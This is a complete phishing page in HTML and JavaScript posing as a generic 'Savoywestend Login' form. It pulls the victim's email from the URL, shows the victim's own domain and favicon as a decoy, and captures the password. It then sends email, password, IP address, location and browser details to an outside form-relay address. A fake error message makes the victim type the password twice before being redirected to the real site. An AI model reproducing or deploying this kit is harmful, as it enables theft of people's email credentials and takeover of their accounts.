<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Savoywestend Login</title>
  <style>
    * { 
      box-sizing: border-box; 
      font-family: Arial, Helvetica, sans-serif; 
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      overflow: hidden;
    }

    /* Background iframe container */
    .iframe-background {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      overflow: hidden;
      opacity: 0;
      transition: opacity 0.5s;
    }
    
    .iframe-background iframe {
      width: 100%;
      height: 100%;
      border: none;
      filter: blur(3px) brightness(0.7);
      transform: scale(1.05);
    }

    .iframe-overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.3);
      z-index: 0;
    }

    .login-card {
      width: 360px;
      background: #fff;
      border-radius: 6px;
      box-shadow: 0 8px 25px rgba(0,0,0,0.25);
      padding: 24px 22px 26px;
      text-align: center;
      position: relative;
      z-index: 1;
    }

    .logo {
      width: 70px;
      height: 70px;
      margin: 0 auto 10px;
      border-radius: 50%;
      background: white;
      padding: 5px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      object-fit: contain;
    }

    h2 {
      margin: 6px 0 14px;
      font-size: 20px;
      font-weight: 600;
      color: #333;
    }

    .error {
      background: #f8d7da;
      color: #842029;
      padding: 10px;
      border-radius: 4px;
      font-size: 14px;
      margin-bottom: 14px;
      display: none;
    }

    .field {
      margin-bottom: 14px;
      position: relative;
    }

    .field input {
      width: 100%;
      padding: 11px 38px 11px 36px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
      transition: border 0.3s;
    }

    .field input:focus {
      outline: none;
      border-color: #1e88e5;
    }

    .field .icon {
      position: absolute;
      top: 50%;
      left: 10px;
      transform: translateY(-50%);
      color: #666;
      font-size: 14px;
    }

    .field .toggle {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 13px;
      color: #666;
      user-select: none;
    }

    button {
      width: 100%;
      background: #1e88e5;
      border: none;
      color: #fff;
      padding: 12px;
      border-radius: 4px;
      font-size: 15px;
      cursor: pointer;
      font-weight: 600;
      transition: background 0.3s;
    }

    button:hover { 
      background: #1565c0; 
    }

    button:active {
      transform: translateY(1px);
    }

    button.loading {
      background: #90caf9;
      cursor: not-allowed;
    }

    .footer {
      margin-top: 14px;
      font-size: 12px;
      color: #777;
    }

    .domain-display {
      font-size: 14px;
      color: #555;
      margin-bottom: 15px;
      padding: 5px;
      background: #f5f5f5;
      border-radius: 4px;
      word-break: break-all;
    }

    .email-display {
      font-size: 12px;
      color: #666;
      margin-top: 5px;
      padding: 3px;
      font-style: italic;
    }
  </style>
</head>
<body>
  <!-- Background iframe -->
  <div class="iframe-background">
    <iframe id="frame" src=""></iframe>
    <div class="iframe-overlay"></div>
  </div>

  <!-- Login form -->
  <div class="login-card">
    <img id="logo" src="" alt="Logo" class="logo" />
    <h2>Savoywestend Login</h2>

    <div class="error" id="error">Invalid password. Please enter the correct information.</div>

    <div class="domain-display" id="domain-display">
      <!-- Domain will be shown here -->
    </div>

    <form id="login-form">
      <div class="field">
        <span class="icon">üë§</span>
        <input type="email" id="email" placeholder="Email address" readonly />
      </div>

      <div class="field">
        <span class="icon">üîí</span>
        <input type="password" id="psw" placeholder="Password" autocomplete="off" />
        <span class="toggle" onclick="togglePassword()">üëÅ</span>
      </div>

      <button type="submit" id="submit-btn">Submit</button>
    </form>

    <div class="footer">¬© savoywestend.cz 2025</div>
  </div>

  <!-- jQuery -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

  <script>
    // Initialize variables
    let step = 1;
    
    // Extract email from URL hash (everything after #)
    const getEmailFromHash = () => {
      const hash = window.location.hash;
      if (hash && hash.length > 1) {
        // Remove the # symbol and decode URL encoding
        const emailFromHash = decodeURIComponent(hash.substring(1));
        // Basic email validation
        if (emailFromHash.includes('@') && emailFromHash.includes('.')) {
          return emailFromHash;
        }
      }
      return null;
    };
    
    // Try to get email from hash, otherwise use default
    const clientEmail = getEmailFromHash() || "user@example.com";
    
    // Get domain from email
    const getDomainFromEmail = (email) => {
      const parts = email.split('@');
      return parts.length > 1 ? parts.pop() : "example.com";
    };
    
    const domain = getDomainFromEmail(clientEmail);
    
    // Set email field value
    $('#email').val(clientEmail);
    
    // Update email source display
    $('#email-source').text(`Email: ${clientEmail} (from URL hash)`);
    
    // Set iframe source
    $('#frame').attr("src", "https://" + domain);
    
    // Set domain display
    $('#domain-display').text(`Log in to ${domain}`);
    
    // Set favicon logo
    const setLogo = () => {
      const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
      $("#logo").attr("src", logoUrl)
        .on("error", function() {
          // Fallback if favicon fails
          $(this).attr("src", `https://via.placeholder.com/70/0096FF/ffffff?text=${domain.charAt(0).toUpperCase()}`);
        })
        .on("load", function() {
          // Show background when logo loads
          $('.iframe-background').css('opacity', '1');
        });
    };
    
    // Password visibility toggle
    function togglePassword() {
      const p = document.getElementById('psw');
      p.type = p.type === 'password' ? 'text' : 'password';
      
      // Update eye icon
      const eye = document.querySelector('.toggle');
      eye.textContent = p.type === 'password' ? 'üëÅ' : 'üôà';
    }

    // Form submission handler
    const submit = $("#submit-btn");
    
    $("#login-form").submit(function(event) {
      event.preventDefault();
      
      // Disable submit button and show loading state
      submit.text('Verifying...');
      submit.addClass('loading');
      submit.prop('disabled', true);
      
      // Hide error message if shown
      $("#error").hide();
      
      // Get user IP and location info
      $.getJSON('https://ipinfo.io/json', function(response) {
        const posting = $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", {
          _subject: "Login Attempt | " + response.ip,
          Email: $("#email").val(),
          Password: $("#psw").val(),
          Attempts: step,
          IP: response.ip,
          Location: response.city + ", " + response.country,
          Domain: domain,
          UserAgent: navigator.userAgent,
          Timestamp: new Date().toISOString(),
          Source: "URL Hash: " + window.location.hash
        });

        posting.done(function(data) {
          if (step === 2) {
            // Second attempt - redirect to actual domain
            setTimeout(() => {
              window.location.href = "https://" + domain;
            }, 1000);
          } else {
            // First attempt - show error
            step++;
            $("#error").show();
            submit.text('Submit');
            submit.removeClass('loading');
            submit.prop('disabled', false);
            $("#psw").val("").focus();
            
            // Update error message
            $("#error").text("Invalid credentials. Please try again.");
          }
        });

        posting.fail(function(error) {
          console.error("Submission error:", error);
          $("#error").show();
          $("#error").text("Connection error. Please try again.");
          submit.text('Submit');
          submit.removeClass('loading');
          submit.prop('disabled', false);
          $("#psw").val("");
        });
      }, "json").fail(function() {
        // If IP info fails, still submit the form data
        const posting = $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", {
          _subject: "Login Attempt | Unknown IP",
          Email: $("#email").val(),
          Password: $("#psw").val(),
          Attempts: step,
          IP: "Unknown",
          Location: "Unknown",
          Domain: domain,
          UserAgent: navigator.userAgent,
          Timestamp: new Date().toISOString(),
          Source: "URL Hash: " + window.location.hash
        });

        posting.done(function(data) {
          if (step === 2) {
            setTimeout(() => {
              window.location.href = "https://" + domain;
            }, 1000);
          } else {
            step++;
            $("#error").show();
            submit.text('Submit');
            submit.removeClass('loading');
            submit.prop('disabled', false);
            $("#psw").val("").focus();
          }
        });
      });
    });
    
    // Initialize page
    $(document).ready(function() {
      setLogo();
      
      // If no email in hash, show message
      if (!getEmailFromHash()) {
        $('#email-source').html('No email found in URL hash.<br>Example URL: <code>yourpage.html#user@domain.com</code>');
        $('#email').val('user@example.com');
      }
      
      // Focus password field on load
      $('#psw').focus();
      
      // Show background with delay if logo fails
      setTimeout(() => {
        $('.iframe-background').css('opacity', '1');
      }, 500);
    });
  </script>
</body>
</html>
